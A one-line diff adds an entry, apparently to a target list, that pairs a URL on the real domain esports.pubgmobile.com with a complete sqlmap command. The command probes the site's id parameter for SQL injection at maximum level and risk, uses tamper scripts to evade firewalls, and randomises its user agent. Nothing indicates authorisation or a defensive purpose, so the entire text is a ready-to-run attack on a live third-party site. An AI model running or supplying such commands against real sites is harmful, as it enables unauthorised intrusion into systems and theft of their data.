@@ -1,0 +1,1 @@
+https://esports.pubgmobile.com/index.php?id=1 (GET)  # sqlmap.py -u https://esports.pubgmobile.com/index.php?id=1 --tamper=between,randomcase --level=5 --risk=3 --batch --random-agent
